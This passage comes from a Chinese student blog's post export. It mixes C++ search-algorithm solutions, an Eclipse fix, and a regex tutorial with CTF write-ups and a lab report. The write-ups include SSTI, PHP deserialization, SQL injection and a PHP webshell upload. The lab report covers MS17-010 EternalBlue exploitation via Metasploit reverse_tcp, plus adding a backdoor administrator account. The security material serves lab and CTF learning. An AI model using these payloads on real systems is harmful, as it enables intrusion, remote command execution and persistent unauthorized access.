while(cin&gt;&gt;n)&#123; while(n--)&#123; cin&gt;&gt;r&gt;&gt;l; for(i=0;i&lt;r;i++)&#123; for(j=0;j&lt;l;j++)&#123; cin&gt;&gt;map[i][j]; if(map[i][j]=='S') //记录起点坐标 &#123; sx=i,sy=j; &#125; else if(map[i][j]=='T') //记录终点坐标 &#123; ex=i,ey=j; &#125; &#125; &#125; cout&lt;&lt;bfs()&lt;&lt;endl; &#125; &#125; return 0; &#125; acwing迷宫问题#include&lt;bits/stdc++.h&gt; using namespace std; const int N=105; int mp[N][N]; int dis[N][N]; typedef pair&lt;int,int&gt; P; int n,m; int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; int x,y,nx,ny; void dfs() &#123; memset(dis,-1,sizeof(dis)); queue&lt;P&gt; qu; qu.push(P(0,0)); dis[0][0]=0; while(!qu.empty()) &#123; P p=qu.front(); qu.pop(); x=p.first,y=p.second; if(x==n-1&amp;&amp;y==m-1) break; for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i],ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;n&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;m&amp;&amp;dis[nx][ny]==-1&amp;&amp;mp[nx][ny]==0) &#123; qu.push(P(nx,ny)); dis[nx][ny]=dis[x][y]+1; &#125; &#125; &#125; if(dis[n-1][m-1]!=-1) cout&lt;&lt;dis[n-1][m-1]; return; &#125; int main() &#123; cin&gt;&gt;n&gt;&gt;m; for(int i=0;i&lt;n;i++) for(int j=0;j&lt;m;j++) cin&gt;&gt;mp[i][j]; dfs(); return 0; &#125; n皇后问题#include&lt;bits/stdc++.h&gt; using namespace std; int n,ans=0; const int N=20; char m[N][N]; bool col[N],dg[N],udg[N]; void dfs(int u) &#123; if(u==n) &#123; // for(int i=0;i&lt;n;i++) // cout&lt;&lt;m[i]&lt;&lt;endl; ans++; return; &#125; for(int i=0;i&lt;n;i++) &#123; if(!col[i]&amp;&amp;!dg[i+u]&amp;&amp;!udg[n-u+i]) &#123; m[u][i]='Q'; col[i]=dg[i+u]=udg[n-u+i]=1; dfs(u+1); col[i]=dg[i+u]=udg[n-u+i]=0;//回溯恢复现场 m[u][i]='.'; &#125; &#125; &#125; int main() &#123; cin&gt;&gt;n; for(int i=0;i&lt;n;i++) for(int j=0;j&lt;n;j++) m[i][j]='.'; dfs(0); cout&lt;&lt;ans; return 0; &#125; m图着色问题题目描述给定无向连通图G和m种不同的颜色，用这些颜色给图的各个顶点着一种颜色，若某种方案使得图中每条边的2个顶点的颜色都不相同，则是一个满足的方案，找出所有的方案。 输入第一行有3个正整数n，k和m，分别表示n个顶点，k条边，m种颜色接下来k行，每行2个正整数，表示一条边的两个顶点 输出所有不同的着色方案数 样例输入5 8 4 1 2 1 3 1 4 2 3 2 4 2 5 3 4 4 5 样例输出48 提示#include&lt;bits/stdc++.h&gt; using namespace std; const int N=105; int mp[N][N]; int color[N]=&#123;0&#125;; int n,k,m,ans=0; void dfs(int d) &#123; if(d==n+1) &#123; ans++; return; &#125; for(int i=1;i&lt;=m;i++) &#123; int flag=1; for(int j=1;j&lt;=n;j++) &#123; if(mp[d][j]&amp;&amp;color[j]==i) &#123; flag=0; break; &#125; &#125; if(flag) &#123; color[d]=i; dfs(d+1); color[d]=0; &#125; &#125; &#125; int main() &#123; cin&gt;&gt;n&gt;&gt;k&gt;&gt;m; for(int i=0;i&lt;k;i++) &#123; int t1,t2; cin&gt;&gt;t1&gt;&gt;t2; mp[t1][t2]=1; mp[t2][t1]=1; &#125; dfs(1); cout&lt;&lt;ans&lt;&lt;endl; return 0; &#125; 部分和题目描述给定n个整数，判断是否可以从中选择若干数字，使得他们的和恰好为k。 输入多组测试用例。 对于每组测试用例，第一行一个正整数n，第二行n个整数，第三行一个整数k。 1*≤N≤*20，输入整数及k均小于1e8。 输出若可以使得和为k，输出”Yes”,否则”No”。 样例输入4 1 2 4 7 13 样例输出Yes #include&lt;bits/stdc++.h&gt; using namespace std; int s[25]; int n,m; bool check(int l,int a) &#123; if(a==m) return true; if(l==n) return false; if(check(l+1,a+s[l])) return true; if(check(l+1,a)) return true; &#125; int main() &#123; cin&gt;&gt;n; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;s[i]; &#125; cin&gt;&gt;m; if(check(0,0)) cout&lt;&lt;\"YES\"; else cout&lt;&lt;\"NO\"; return 0; &#125;","tags":[]},{"title":"google搜索引擎&eclipse启动问题","date":"2020-11-02T08:37:34.000Z","path":"2020/11/02/eclipse启动问题/","text":"谷歌搜索引擎前两天突然无法搜索东西但是可以继续访问YouTube，就**离谱。 由于课程原因需要学习java，今天就下载了一个Java常用的编辑器eclipse，但是启动时给我一个弹窗，版本不一致。 google浏览器问题Google浏览器可以访问外网，但是无法使用搜索引擎搜东西，每次显示无法连接www.google.com 解决一开始想着卸载重装，发现还是不行，后来换成了测试版本结果真能用，但是两天没到又出现那种情况，很无语 想着应该是google.com被屏蔽了，试着清除dns缓存 ipconfig /flushdns 还是不行，直接释放ip重新申请 ipconfig /release ipconfig /renew 然后就可以用了。。 （几个小时过去了就他妈不能用了，真尼玛离谱） eclipse问题问题弹窗内容 Version 1.8.0_271 of the JVM is not suitable for this product.Version: 11or greater is required. JVM的1.8.0_271版本不适合此产品。版本：11或更高版本是必需的。 大概意思就是当前的jvm版本与软件不相容 解决方法1.找到java安装的路径默认安装是下面这个路径 C:\\Program Files\\Java\\ 找到 C:\\Program Files\\Java\\jre1.8.0_271\\bin\\javaw.exe 2.打开eclipse的安装路径，打开eclipse.ini修改成下面这样 -startup plugins/org.eclipse.equinox.launcher_1.5.800.v20200727-1323.jar --launcher.library plugins/org.eclipse.equinox.launcher.win32.win32.x86_64_1.1.1300.v20200819-0940 -product org.eclipse.epp.package.java.product -showsplash org.eclipse.epp.package.common --launcher.defaultAction openFile --launcher.defaultAction openFile --launcher.appendVmargs -vm //这两行 C:\\Program Files\\Java\\jre1.8.0_271\\bin\\javaw.exe //是添加的 -vmargs -Dosgi.requiredJavaVersion=1.8 //这里改为jdk版本号 -Dosgi.instance.area.default=@user.home/eclipse-workspace -XX:+UseG1GC -XX:+UseStringDeduplication --add-modules=ALL-SYSTEM -Dosgi.requiredJavaVersion=1.8 //这里也一样 -Dosgi.dataAreaRequiresExplicitInit=true -Xms256m -Xmx2048m --add-modules=ALL-SYSTEM 保存后成功启动。","tags":[]},{"title":"正则表达式","date":"2020-11-01T13:31:31.000Z","path":"2020/11/01/preg/","text":"在一些代码审计的题目当中经常会出现使用正则表达过滤字符串的情况，所以有必要系统的学习一下！ 什么是正则表达式详情见这 菜鸡教程中介绍的很详细。 特殊字符许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符\\ 放在它们前面。下表列出了正则表达式中的特殊字符： 特别字符 描述 $ 匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\\n’ 或 ‘\\r’。要匹配 $ 字符本身，请使用 \\$。 ( ) 标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。 * 匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 \\*。 + 匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 \\+。 . 匹配除换行符 \\n 之外的任何单字符。要匹配 . ，请使用 \\. 。 [ 标记一个中括号表达式的开始。要匹配 [，请使用\\[。 ? 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 ?。 \\ 将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\\n’ 匹配换行符。序列 ‘\\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。 ^ 匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合。要匹配 ^ 字符本身，请使用 ^。 { 标记限定符表达式的开始。要匹配 {，请使用 \\{。 | 指明两项之间的一个选择。要匹配 |，请使用 \\ 限定符限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 *** 或 **+ 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。 正则表达式的限定符有： 字符 描述 * 匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。 + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 ? 匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。 常用的正则表达式及含义参考 一、校验数字的表达式 1. 数字：^[0-9]*$ // ^表示字符的开始，$表示结束 [0-9] 表示字符串中的字符在0-9中 2. n位的数字：^\\d&#123;n&#125;$ // \\d与[0-9]等价 ，&#123;n&#125; n表示匹配n次，所以表示匹配n位数 3. 至少n位的数字：^\\d&#123;n,&#125;$ //&#123;n,&#125;至少n次 4. m-n位的数字：^\\d&#123;m,n&#125;$ //&#123;n,m&#125; n-m次 5. 零和非零开头的数字：^(0|[1-9][0-9]*)$ // | 是或者意思，表示匹配左右两个子表达式其中一个都可以 6. 非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(.[0-9]&#123;1,2&#125;)?$ // +匹配前面的表达式一次或多次 (.[0-9]&#123;1,2&#125;)? 表示匹配 (.[0-9]&#123;1,2&#125;)一次或零次这子表达式代表的是0.[1-9]或者0.[0-9][1-9] 7. 带1-2位小数的正数或负数：^(\\-)?\\d+(\\.\\d&#123;1,2&#125;)?$ // (\\-)? 匹配一次或零次负号 8. 正数、负数、和小数：^(\\-|\\+)?\\d+(\\.\\d+)?$ // \\- \\+ \\.是将特殊字符转义 9. 有两位小数的正实数：^[0-9]+(.[0-9]&#123;2&#125;)?$ 10. 有1~3位小数的正实数：^[0-9]+(.[0-9]&#123;1,3&#125;)?$ 11. 非零的正整数：^[1-9]\\d*$ 或 ^([1-9][0-9]*)&#123;1,3&#125;$ 或 ^\\+?[1-9][0-9]*$ // [1-9] 控制非零 12. 非零的负整数：^\\-[1-9][]0-9\"*$ 或 ^-[1-9]\\d*$ //一下的表达式的含义可以以此类推（感觉不是很常用） 13. 非负整数：^\\d+$ 或 ^[1-9]\\d*|0$ 14. 非正整数：^-[1-9]\\d*|0$ 或 ^((-\\d+)|(0+))$ 15. 非负浮点数：^\\d+(\\.\\d+)?$ 或 ^[1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*|0?\\.0+|0$ 16. 非正浮点数：^((-\\d+(\\.\\d+)?)|(0+(\\.0+)?))$ 或 ^(-([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*))|0?\\.0+|0$ 17. 正浮点数：^[1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*$ 或 ^(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*))$ 18. 负浮点数：^-([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*)$ 或 ^(-(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*)))$ 19. 浮点数：^(-?\\d+)(\\.\\d+)?$ 或 ^-?([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*|0?\\.0+|0)$ 二、校验字符的表达式 1. 汉字：^[\\u4e00-\\u9fa5]&#123;0,&#125;$ //u4e00是unicode中第一个汉字编码 u9fa5是最后一个 2. 英文和数字：^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]&#123;4,40&#125;$ //[A-Za-z0-9]可以匹配大小写字母数字 3. 长度为3-20的所有字符：^.&#123;3,20&#125;$ // .代表任意字符包括换行符 4. 由26个英文字母组成的字符串：^[A-Za-z]+$ 5. 由26个大写英文字母组成的字符串：^[A-Z]+$ 6. 由26个小写英文字母组成的字符串：^[a-z]+$ 7. 由数字和26个英文字母组成的字符串：^[A-Za-z0-9]+$ //与第二个表达式相同 8. 由数字、26个英文字母或者下划线组成的字符串：^\\w+$ 或 ^\\w&#123;3,20&#125;$ // \\w=[0-9A-Za-z_] 9. 中文、英文、数字包括下划线：^[\\u4E00-\\u9FA5A-Za-z0-9_]+$ 10. 中文、英文、数字但不包括下划线等符号：^[\\u4E00-\\u9FA5A-Za-z0-9]+$ 或 ^[\\u4E00-\\u9FA5A-Za-z0-9]&#123;2,20&#125;$ 11. 可以输入含有^%&amp;',;=?$\\\"等字符：[^%&amp;',;=?$\\x22]+ 12 禁止输入含有~的字符：[^~\\x22]+ //这里的 ^是非的意思 下面这些就不一一解释了，实在太多了有的还是重复。 三、特殊需求表达式 1. Email地址：^\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$ 2. 域名：[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(/.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+/.? 3. InternetURL：[a-zA-z]+://[^\\s]* 或 ^http://([\\w-]+\\.)+[\\w-]+(/[\\w-./?%&amp;=]*)?$ 4. 手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\\d&#123;8&#125;$ 5. 电话号码(\"XXX-XXXXXXX\"、\"XXXX-XXXXXXXX\"、\"XXX-XXXXXXX\"、\"XXX-XXXXXXXX\"、\"XXXXXXX\"和\"XXXXXXXX)：^(\\(\\d&#123;3,4&#125;-)|\\d&#123;3.4&#125;-)?\\d&#123;7,8&#125;$ 6. 国内电话号码(0511-4405222、021-87888822)：\\d&#123;3&#125;-\\d&#123;8&#125;|\\d&#123;4&#125;-\\d&#123;7&#125; 7. 身份证号(15位、18位数字)：^\\d&#123;15&#125;|\\d&#123;18&#125;$ 8. 短身份证号码(数字、字母x结尾)：^([0-9])&#123;7,18&#125;(x|X)?$ 或 ^\\d&#123;8,18&#125;|[0-9x]&#123;8,18&#125;|[0-9X]&#123;8,18&#125;?$ 9. 帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]&#123;4,15&#125;$ 10. 密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\\w&#123;5,17&#125;$ 11. 强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)：^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).&#123;8,10&#125;$ 12. 日期格式：^\\d&#123;4&#125;-\\d&#123;1,2&#125;-\\d&#123;1,2&#125; 13. 一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$ 14. 一个月的31天(01～09和1～31)：^((0?[1-9])|((1|2)[0-9])|30|31)$ 14 钱的输入格式： 15 1.有四种钱的表示形式我们可以接受:\"10000.00\" 和 \"10,000.00\", 和没有 \"分\" 的 \"10000\" 和 \"10,000\"：^[1-9][0-9]*$ 16 2.这表示任意一个不以0开头的数字,但是,这也意味着一个字符\"0\"不通过,所以我们采用下面的形式：^(0|[1-9][0-9]*)$ 17 3.一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：^(0|-?[1-9][0-9]*)$ 18 4.这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉,因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：^[0-9]+(.[0-9]+)?$ 19 5.必须说明的是,小数点后面至少应该有1位数,所以\"10.\"是不通过的,但是 \"10\" 和 \"10.2\" 是通过的：^[0-9]+(.[0-9]&#123;2&#125;)?$ 20 6.这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：^[0-9]+(.[0-9]&#123;1,2&#125;)?$ 21 7.这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样：^[0-9]&#123;1,3&#125;(,[0-9]&#123;3&#125;)*(.[0-9]&#123;1,2&#125;)?$ 22 8.1到3个数字,后面跟着任意个 逗号+3个数字,逗号成为可选,而不是必须：^([0-9]+|[0-9]&#123;1,3&#125;(,[0-9]&#123;3&#125;)*)(.[0-9]&#123;1,2&#125;)?$ 23 备注：这就是最终结果了,别忘了\"+\"可以用\"*\"替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里 24 xml文件：^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\\\.[x|X][m|M][l|L]$ 25 中文字符的正则表达式：[\\u4e00-\\u9fa5] 26 双字节字符：[^\\x00-\\xff] (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1)) 27 空白行的正则表达式：\\n\\s*\\r (可以用来删除空白行) 28 HTML标记的正则表达式：&lt;(\\S*?)[^&gt;]*&gt;.*?&lt;/\\1&gt;|&lt;.*? /&gt; (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力) 29 首尾空白字符的正则表达式：^\\s*|\\s*$或(^\\s*)|(\\s*$) (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式) 30 腾讯QQ号：[1-9][0-9]&#123;4,&#125; (腾讯QQ号从10000开始) 31 中国邮政编码：[1-9]\\d&#123;5&#125;(?!\\d) (中国邮政编码为6位数字) 32 IP地址：\\d+\\.\\d+\\.\\d+\\.\\d+ (提取IP地址时有用) 33 IP地址：((?:(?:25[0-5]|2[0-4]\\\\d|[01]?\\\\d?\\\\d)\\\\.)&#123;3&#125;(?:25[0-5]|2[0-4]\\\\d|[01]?\\\\d?\\\\d)) 34 将url的协议，主机名，端口号，文件路径放到数组中: var str = \"http://www.runoob.com:80/html/html-tutorial.html\"; var patt1 = /(\\w+):\\/\\/([^/:]+)(:\\d*)?([^# ]*)/; //四个子表达式组合在一起，(\\w+): 匹配字符串开始到: ([^/:]+) 匹配非/ 非:后的内容 (:\\d*)? 匹配:后的若干数字且表达式重复一次或多次 ([^# ]*) 匹配不包括#或空格字符的任何字符序列 总结正则表达式的功能还是很强大的，想要写出能准确匹配目标的表达式还是需要认真学习的，但是代码审计中的要求没那么严格，只需要能看懂表达式匹配了哪些内容即可。","tags":[]},{"title":"cumt华为杯","date":"2020-10-28T12:26:38.000Z","path":"2020/10/28/华为杯/","text":"cumt_华为杯经典的学长虐菜局，web只做出来一个，另外两题好不容易有思路了，都被卡死了 webdoge真签到题，抽个奖就给出了flag babyflask刚进入页面，只有一张图片，查看源码也没发现什么 就是了模板注入 url+&#123;&#123;7*7&#125;&#125;Copy 页面出现404报错，并且显示的是url+49，确定是模板注入 &#123;&#123;''.__class__.__mro__[2].__subclasses__()&#125;&#125; 查看模块时，发现存在waf 经过测试发现是过滤了[] 于是使用 &#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__()&#125;&#125; 存在file模块 用read读取文件内容 exp: ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag').read()Copy 参考链接：https://xz.aliyun.com/t/8029 VulnCMS这题是真滴无语，开始以为是XSS，后来学长提示不是，又找到了文件上传的漏洞，直接拿到了网站根目录本以为做出了，结果提示flag not here,心态炸裂，但是提示了”投个稿？“，应该是在投稿位置下功夫吧。到最后也没做出了，但是找到了漏洞代码，应该是sql注入。 这里给出大神的做法 Hodor这题基本上是原题，但是加了一层过滤，怎么都没绕过去。。。 看到WP是大S绕过，涨知识了 &lt;?php Class Source &#123; public function __toString() &#123; return highlight_file('license.txt', true).highlight_file($this-&gt;source, true); &#125; &#125; function easy_check($str) &#123; //echo $str; if (preg_match(\"/flag/i\", $str, $matches)) &#123; return false; &#125; return true; &#125; if(isset($_GET['source']))&#123; $s = new Source(); $s-&gt;source = __FILE__; echo $s; exit; &#125; $todos = []; if(isset($_COOKIE['todos']))&#123; if(!easy_check($_COOKIE['todos'])) &#123; echo \"Hacker!\\n\"; &#125; else &#123; $c = $_COOKIE['todos']; $h = substr($c, 0, 32); $m = substr($c, 32); if(md5($m) === $h)&#123; $todos = unserialize($m); &#125; &#125; &#125; if(isset($_POST['text']))&#123; $todo = $_POST['text']; $todos[] = $todo; $m = serialize($todos); $h = md5($m); setcookie('todos', $h.$m); header('Location: '.$_SERVER['REQUEST_URI']); exit; &#125; // flag is in flag.php ?Copy exp echo md5('a:2:&#123;i:0;s:3:\"123\";i:1;O:6:\"Source\":1: &#123;s:6:\"source\";S:8:\"\\66lag.php\";&#125;&#125;'); echo urlencode('ae5860e508aaf353a9ad78ac246f46fba:2: &#123;i:0;s:3:\"123\";i:1;O:6:\"Source\":1:&#123;s:6:\"source\";S:8:\"\\66lag.php\";&#125;&#125;');Copy 参考 https://blog.csdn.net/SmileAndFun/article/details/108497183 webcms是一个博客管理的网站，其实也是个原题，考察点是文件上传 漏洞点在图片中上传图片的位置 随便上传一张图片试试，抓包结果如下，几个注意点 1.filetype规定了文件的类型 2.上传时，将图片保存为了base64形式 所以上传一句话木马的时候要注意修改对应的位置 一句话木马类型为php,则filetype改为php 内容为密码为cmd一句话木马，对应的base64编码PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg== 上传成功，访问保存的路径：http://219.219.61.234:20203/upload/tmp/1_Y2R8AK57UWV4JBW.php POST: cmd=system(\"cat /flag\"); 或者蚁剑连接，密码cmdCopy MiscMIsc部分基本都是队友做的，好像也不是太难 伪web真是伪web。。。 直接在文件里搜索就能到flag 搜索关键词cmut，flag所在文件夹为html\\include\\include.php","tags":[{"name":"unserialize","slug":"unserialize","permalink":"https://sunzhengyu99.github.io/tags/unserialize/"},{"name":"ssti","slug":"ssti","permalink":"https://sunzhengyu99.github.io/tags/ssti/"},{"name":"文件上传","slug":"文件上传","permalink":"https://sunzhengyu99.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"buuctf-LFI","date":"2020-10-08T12:35:05.000Z","path":"2020/10/08/buuoj-LFI/","text":"","tags":[{"name":"LFI","slug":"LFI","permalink":"https://sunzhengyu99.github.io/tags/LFI/"}]},{"title":"网安作业1","date":"2020-09-27T14:21:14.000Z","path":"2020/09/27/homework/","text":"MS17-010 1.准备工作开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方 将两台虚拟机桥接到同一网卡，并保证能够通信 Kali IP 10.1.1.1 255.0.0.0 win7 IP 10.1.1.2 255.0.0.0 测试两台主机之间的通信情况 使用msf前需要开启postgresql服务 开启服务：service postgresql start 查看服务状态：service postgresql status 开到绿色字体的active即为开启了 初始化数据库：msfdb init 2. 攻击过程(1).首先判断目标主机是否打开445端口使用nmap+ip 扫描 (2) .确认目标主机打开445端口后直接使用msf进行攻击输入msfconsole 启动ｍｓｆ 输入search MS17-010 找到exploit windows/smb/ms17_010_eternalblue, 运行 use exploitwindows/smb/ms17_010_eternalblue 输入 show options 查看需要配置哪些信息 RHOSTS 为目标主机IP(10.1.1.2) RPORT 为目标端口号(445) LHOST 为监听主机IP(10.1.1.1) (3). 配置成功后设置tcp连接输入命令 set payload windows/x64/meterpreter/reverse_tcp (4).开始运行输入 exploit/run 成功获取shell 查看ip地址验证是否为目标主机。 (5)设立后门，在目标主机中创建一个用户创建一个用户 net user test abc123.com /add Username:test password:abc123.com 将该用户加入管理员组，使其拥有管理员权限 net localgroup administrtors test /add 目标主机上用户创建成功 实验结束","tags":[{"name":"msf","slug":"msf","permalink":"https://sunzhengyu99.github.io/tags/msf/"}]},{"title":"cumtctf","date":"2020-09-27T13:26:44.000Z","path":"2020/09/27/cumtctf/","text":"CUMTCTF-wp Web签到提示GET一个1,那就 url+?1 提示post一个2 那就post一个 注意的是要2=任意字符才出现源码 审计代码，这里应该是利用file_get_contents()的漏洞直接读网页源码，并且提示flag在flag.php,直接php://filter/read=convert.base64-encode/resource=flag.php，读取base64源码之后解码即可 PD9waHANCgkkZmxhZz0iQ1VNVENURnsxNzkwNTViNC1lOGY1LTQyZDItYmZlNC0wMjdkMTVlOTQ2YjJ9Ijs= babysql首先判断是否存在注入username=admin&amp;password=pw&#39; 在后面加上单引号后出现报错提示，确认有注入点 但是继续测试 &#39;or 1=1 #会出现 判断存在黑名单过滤。 接下来就是判断是将什么加入黑名单了，经过字典测试发现是空格，这里可以使用/**/绕过。 先测试有多少列，&#39;union/**/select/**/1,2,3,4,5,6,7# 到第七的时候，页面报错。 &#39;union/**/select/**/1,2,3,4,5,6,7,8# 到第八的时候显示下图，说明一共八列，并且第四列出现回显。 爆表 username=admin&amp;password=pw'union/**/select/**/1,2,3,group_concat(TABLE_NAME),5,6,7,8/**/from/**/information_schema.TABLES/**/where/**/TABLE_SCHEMA=database()# 爆列名 username=admin&amp;password=pw'union/**/select/**/1,2,3,group_concat(COLUMN_NAME),5,6,7,8/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_NAME='users'# user_id,first_name,last_name,user,password,avatar,last_login,failed_login列名很多，选择password 爆flag username=admin&amp;password=pw'union/**/select/**/1,2,3,group_concat(password),5,6,7,8/**/from/**/users# secret扫描一下目录发现存在一个www.zip的文件，直接下载得到源码，下面就是一层一层的绕过 &lt;?php error_reporting(0); include_once('flag.php'); if(isset($_GET['param1'])) &#123; $str1=$_GET['param1']; if(file_get_contents($str1)!=='Suvin_wants_a_girlfriend') die(\"Suvin doesn't like you\"); if(isset($_GET['param2']))&#123; $str2=$_GET['param2']; if(!is_numeric($str2)) die('Suvin prefers strings of Numbers'); else if($str2&lt;3600*24*30) die('Suvin says the num is too short'); else if($str2&gt;3600*24*31) die('Suvin says the num is too long'); else &#123; echo \"Suvin says he's falling in love with you!\".\"&lt;/br&gt;\"; sleep(intval($str2)); &#125; if (isset($_POST['param1']) &amp;&amp; isset($_POST['param2'])) &#123; $str1=$_POST['param1']; $str2=$_POST['param2']; if(strlen($str1)&gt;1000) die(\"It's too long\"); if(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2))) echo $flag; else die(\"It's so similar to md5\"); &#125; &#125; &#125; ?&gt; 首先get方式获取两个参数，param1要等于那个字符串，这里使用php的data伪协议 param2要在3600*24*30和3600*24*31之间，可以取2.6e6,这两个参数绕过后，就要绕过下面的post方式上传的两个值 对parame1的长度进行了限制，并且两参数的字符串形式不相等，sha1的值要相等，首先想到的是与md5函数一样，使用数组绕过，但是这题没那么简单，试了很多次都不行。网上搜了一下，发现了一个很类似的题目（sha1弱碰撞），其中也给出符合要求的字符串。 点这里 完整的payload： ?param1=data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k&amp;param2=0.26e7 POST: param1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;param2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 还有一个很坑的地方，hackbar上传时没有作用，只能用bp抓包上传，抓包时注意先随便post一个参数，这样数据包才是post方式，然后贴上上面的两个参数值 babysql2查询语句与第一个注入相同，但是这题不给回显，猜测是盲注，但是好像过滤了更多的关键字 在1的基础上额外过滤了 ‘ ， ascii ， mid ， substr ，关闭了报错回显和输出，但是查询成功或者失败 回显不同，因此可以bool注入。 url = 'http://219.219.61.234:20004/' password = \"\" string = 